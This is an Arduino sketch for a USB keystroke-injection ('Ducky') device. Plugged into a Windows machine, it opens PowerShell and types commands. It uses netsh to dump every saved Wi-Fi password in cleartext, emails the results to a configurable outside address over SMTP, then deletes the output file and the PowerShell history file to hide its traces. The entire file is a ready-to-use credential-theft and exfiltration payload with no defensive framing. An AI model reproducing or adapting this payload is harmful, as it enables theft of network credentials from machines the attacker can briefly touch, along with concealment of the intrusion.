#include<Keyboard.h>

void typeKey(int key){
    Keyboard.press(key);
    delay(50);
    Keyboard.release(key);
}

void setup() {  
  //begin keyboard stream
  Keyboard.begin();

  //init wait 500ms
  delay(500);

  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  //wait for run windows popup
  delay(100);

  Keyboard.print("powershell");
  delay(100);

  typeKey(KEY_RETURN);

  //wait for powershell popup
  delay(200);

  //capture wifi pw -> rsl file 
  char payload[] = "netsh wlan show profile > rsl; echo \"==========================================\" >> rsl; netsh wlan show profile * key=clear >> rsl";

  Keyboard.print(payload);
  typeKey(KEY_RETURN);
  delay(50);

  //setup smtp
  char smtpSetup[] = "$SMTPServer = '<smtp server>';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email username>', '<password>');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = 'nowhere@gmail.com';$ReportEmail.To.Add('<email>');$ReportEmail.Subject = 'Report from Ducky';$ReportEmail.Body = Get-Content .\\rsl -Raw ";

  Keyboard.print(smtpSetup);
  typeKey(KEY_RETURN);
  delay(50);

  //sent email
  char sentEmail[] = "$SMTPInfo.Send($ReportEmail)";

  Keyboard.print(sentEmail);
  typeKey(KEY_RETURN);
  delay(1000);

  //remove trace
  char rem[] = "rm rsl;clear;Clear-History;rm $env:AppData\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt;exit";

  Keyboard.print(rem);
  typeKey(KEY_RETURN);
  delay(50);
    
  //end keyboard stream
  Keyboard.end();
}

//this case not going to use this endless looping
void loop() {
  // put your main code here, to run repeatedly:

}
